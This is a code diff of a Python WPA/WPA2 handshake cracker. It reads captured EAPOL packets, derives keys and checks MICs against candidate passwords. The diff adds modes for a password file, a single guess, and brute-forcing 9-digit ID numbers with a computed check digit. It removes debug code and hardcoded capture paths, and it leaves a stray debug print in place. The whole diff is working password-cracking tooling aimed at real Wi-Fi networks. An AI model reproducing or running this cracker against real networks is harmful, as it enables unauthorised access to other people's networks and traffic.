@@ -33,8 +33,6 @@ def extract_nonces(handshake_data: List[bytes]) -> Tuple[bytes, bytes]:
     snonce = snonce_packet_data[NONCE_OFFSET:NONCE_END]
     return anonce, snonce
 
-#8801000028b37134f6bc30050575bedf28b37134f6bc00001012aaaa03000000888e0203007502010a00100000000000000001013a9e0394be853e01ce13c180052a4bf42f57c0dbe398fee3ba00269233ac600000000000000000000000000000000000000000000000000000000000000000dd6d91ede26f183eb5f6fa1583486aef001630140100000fac040100000fac040100000fac020c00
-
 
 def get_mic_frame(handshake_data: List[bytes]) -> bytes:
     mic_frame = handshake_data[1]
@@ -81,19 +79,6 @@ def calc_mic(ptk: bytes, mic_frame: bytes) -> bytes:
     return mic[:-4]
 
 
-def get_mic(ap_ssid, handshake):
-    handshake_data = [get_eapol_bytes(packet) for packet in handshake]
-    ap_mac = mac_string_to_bytes(handshake[0].addr2)
-    cl_mac = mac_string_to_bytes(handshake[0].addr1)
-    anonce, snonce = extract_nonces(handshake_data)
-    key_data = get_key_data(ap_mac, cl_mac, anonce, snonce)
-    mic_frame = get_mic_frame(handshake_data)
-
-    pmk = calc_pmk(ap_ssid.encode("ascii"), password.encode("ascii"))
-    ptk = calc_ptk(pmk, key_data)
-    return calc_mic(ptk, mic_frame)
-
-
 def crack_handshake(
     ap_ssid: str, handshake: List[scapy.packet], password_list, debug=False
 ) -> None:
@@ -131,7 +116,6 @@ def crack_eapol(ap_ssid: str, pcap_filename: str, password_list, debug=False):
 
 
 def get_password_list(prefix: str):
-
     def luhn_correct_bit(first_digits):
         res = 0
         i = 0
@@ -146,7 +130,7 @@ def get_password_list(prefix: str):
                 res += val
             i += 1
         return str((10 - res) % 10)
-
+    print(luhn_correct_bit("12345678"))
     remaining_digits = 8 - len(prefix)
     for i in range(10**remaining_digits):
         first_digits = prefix + str(i).zfill(remaining_digits)
@@ -156,16 +140,24 @@ def get_password_list(prefix: str):
 
 
 if __name__ == "__main__":
-    if len(sys.argv) != 4:
-        print("Usage: ", sys.argv[0], "<beacon ssid> <pcap filename> <password prefix>")
+    if len(sys.argv) != 5:
+        print("Usage: ", sys.argv[0], "<beacon ssid> <pcap filename> <password list type> <password list specifier>")
+        print("Possible password list types are: `guess_taz`, `password_file`, `single_guess`")
+        print("If you use `guess_taz` it will guess all the 9 digit ID numbers starting with the password list specifier")
+        print("Using `Password_file` will make the cracker try all the passwords in the file given by the password list specifier")
+        print("For trying a single guess, `single_guess` will make the cracker try the password list specifier as an attempt")
+        exit(1)
     ssid = sys.argv[1]
     filename = sys.argv[2]
-    password_prefix = sys.argv[3]
-    password_list = get_password_list(password_prefix)
+    password_list_type = sys.argv[3]
+    password_list_specifier = sys.argv[4]
+    password_list = [password_list_specifier]
+    if password_list_type == "guess_taz":
+        password_list = get_password_list(password_list_specifier)
+    elif password_list_type == "password_file":
+        with open(password_list_specifier, "r") as file:
+            password_list = file.readlines()
+    elif password_list_type != "single_guess":
+        print("Wrong password list type")
+        exit(1)
     crack_eapol(ssid, filename, password_list)
-# crack_eapol("Building_G2", "/home/yuval/pcap/res.pcap-01.cap", ["not_password", "password", "123456789"])
-crack_eapol(
-    "Test_AP",
-    "/home/yuval/Downloads/handshake-Test_AP.pcap",
-    ["not_password", "password"],
-)
